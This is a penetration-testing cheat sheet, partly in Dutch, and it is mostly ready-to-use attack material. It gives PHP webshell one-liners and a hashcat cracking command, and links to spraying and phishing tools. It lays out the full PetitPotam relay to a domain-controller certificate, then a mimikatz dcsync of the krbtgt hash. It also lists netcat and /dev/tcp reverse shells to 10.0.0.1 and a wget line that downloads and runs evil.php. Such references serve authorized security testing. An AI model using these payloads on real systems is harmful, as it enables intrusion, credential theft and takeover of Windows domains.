# Enumeration
## Wordlists

https://wordlists.assetnote.io \
https://github.com/danielmiessler/SecLists \
https://github.com/xajkep/wordlists 

<br />

# Web 

## Webshells
PHP \
`<?php if(isset($_REQUEST['cmd'])){ echo "<pre>"; $cmd = ($_REQUEST['cmd']); system($cmd); echo "</pre>"; die; }?>`
Execute one command\
`<?php system("whoami"); ?>`

Take input from the url paramter. shell.php?cmd=whoami\
`<?php system($_GET['cmd']); ?>`

The same but using passthru\
`<?php passthru($_GET['cmd']); ?>`

For shell_exec to output the result you need to echo it\
`<?php echo shell_exec("whoami");?>`

Exec() does not output the result without echo, and only output the last line. So not very useful!\
`<?php echo exec("whoami");?>`

Instead to this if you can. It will return the output as an array, and then print it all.\
`<?php exec("ls -la",$array); print_r($array); ?>`

preg_replace(). This is a cool trick\
`<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>`

Using backticks\
`<?php $output =\'whoami\`; echo "\<pre>$output\</pre>"; ?>`

Using backticks\
`<?php echo ```whoami```; ?>`



## Mendix
Schema/id en entity enumeration:
1. .XML frontend files enumeraten en dan zoeken op 'entity', staat soms guid bij
2. initiele sessie response bevat juicy data zoeken op 'klass' om objecten te vinden
3. Probeer de microflows te enumeraten via:
//MxModelReflection.Microflows (geen guid nodig)

## Citrix
https://github.com/Smarttech247PT/citrix_fgateway_fingerprint

Directories and files:
```
/cgi/Resources/List
/cgi/GetAuthMethods 
/nf/auth/getAuthenticationRequirements.do
/nf/auth/doEPA.do
/nf/auth/doLogoff.do
/nf/auth/getECdetails
/nf/auth/doAuthentication.do
```

 
 
 <br /><br />


# Passwords



## Password Cracking

Cracking IPMI 
```
./hashcat -m 7300 ~/Desktop/hashes ~/Desktop/Lists/passwords.txt --username
```
Wordlists: \
https://github.com/ohmybahgosh/RockYou2021.txt \
https://raw.githubusercontent.com/OpenTaal/opentaal-wordlist/master/wordlist.txt \
https://github.com/OpenTaal/opentaal-wordlist


Resources and tools: \
https://github.com/JakeWnuk/HIBPv7-Resources \
https://github.com/glitchedgitz/cook 

Rules:\
https://github.com/rarecoil/pantagrule \
https://github.com/Unic0rn28/hashcat-rules/blob/main/unicorn%20rules/SuperUnicorn.rule \
https://github.com/NotSoSecure/password_cracking_rules \ 
https://github.com/n0kovo/hashcat-rules-collection

## Password Spraying / Login 

https://github.com/knavesec/CredMaster \
https://github.com/blacklanternsecurity/TREVORspray \
https://github.com/byt3bl33d3r/SprayingToolkit \
https://github.com/dafthack/DomainPasswordSpray \  
https://github.com/dafthack/MailSniper 
<br /><br />
 
# Phishing 
https://github.com/tokyoneon/CredPhish





<br /><br />


# Internal attacks


## RDP Attacks

https://github.com/0x09AL/RdpThief

## Petite Potam
PetitPotam
```
1. Gebruik crackmapexec (of een andere tool/script) om de Active Directory Certificate Services systemen op te vragen.
(Nieuwste versie van cme is benodigd om ldap module te kunnen gebruiken, bijvoorbeeld 5.2.3)
cme ldap 'domaincontroller' -d 'domain' -u 'user' -p 'password' -M adcs 

2. Zet de relay aanval op richting de Certificate Authority server:
impacket-ntlmrelayx -debug -smb2support --adcs -t https://<CA SERVER>/certsrv/certfnsh.asp --template DomainController

Trigger de NTLM authenticatie zodat de reflectie verstuurd kan worden middels PetitPotam.py (topotam):
3. python3 PetitPotam.py <responder IP> <domain> -u 'username' -p 'password'
  
Als de aanval succesvol verloopt beschik je nu over het CA certificaat in base64 vorm.

4. Start 'kekeo.exe' (gentlwiki), schakel Base64 input in en vraag een TGT (Ticket Granting Ticket) aan middels het eerder bemachtigde certificaat (PBX)
a. kekeo # base64 /input:on
b. kekeo # tgt::ask /pfx:<base64 pbx certificate> /user:<DC$ username> /domain:<domain> /ptt

5. Start mimikatz (gentlwiki) om een dcsync uit te voeren en de NTLM hash van iedere gewenste user te dumpen:
1. lsadump::dcsync /domain:<domain> /user:krbtgt
2. lsadump::dcsync /domain:<domain> /user:dcadmin
```

# Post Exploitation
<br/>
# Linux
Getting a shell:
```
python -c 'import pty; pty.spawn("/bin/sh")'
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/sh")'
python3 -c 'import pty; pty.spawn("/bin/bash")'
echo os.system('/bin/bash')
/bin/sh -i
perl -e 'exec "/bin/sh";'
perl: exec "/bin/sh";
ruby: exec "/bin/sh"
lua: os.execute('/bin/sh')
irb: exec "/bin/sh"
vi: :!bash
vi: :set shell=/bin/bash:shell
nmap: !sh
```
## Netcat
Reverse shell:
`nc 172.16.1.100 443 -e /bin/sh`
Sendinf file:
`nc -l -p 443 > out.file`
`nc -w 3 10.0.0.1 443 < in.file` 

## Netcat without Netcat
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 443 >/tmp/f
mknod backpipe p; nc 10.0.0.1 443 0<backpipe | /bin/bash 1>backpipe
/bin/bash -i > /dev/tcp/10.0.0.1/443 0<&1 2>&1
mknod backpipe p; telnet 10.0.0.1 443 0<backpipe | /bin/bash 1>backpipe
telnet 10.0.0.1 <1st_port> | /bin/bash | telnet 10.0.0.1 <2nd_port>
wget -O /tmp/bd.php http://10.0.0.1/evil.php && php -f /tmp/bd.php
 ```
<br /><br />

# Windows

Directory name bypasses:
```
C:\>powershell C:\??*?\*3?\c?lc.?x? calc.exe
C:\>powershell C:\*\*2\n??e*d.* notepad.exe
C:\>powershell C:\*\*2\t?s*r.* taskmgr.exe
```
8.3 / Short filename notation:
```
dir /a:h /x
for %A in (*.*) do @echo %~nsA %~nA

C:\>dir /a:h /x
                                        *
13/10/2011  09:14 AM    <DIR>          DOCUME~1     Documents and Settings
13/10/2011  09:05 AM    <DIR>          PROGRA~1     Program Files
13/10/2011  09:05 AM    <DIR>          PROGRA~2     Program Files(x86)

C:\>for %A in (*.*) do @echo %~nsA %~nA
$WINDOWS $WINDOWS
DOCUME~1 Documents and Settings
NVIDIA~1 NVIDIA Corporation
SYSTEM~1 System Volume Information
```

 # Physical attacks
  
  
 ## BIOS
 https://github.com/skysafe/reblog/blob/main/0000-defeating-a-laptops-bios-password/README.md

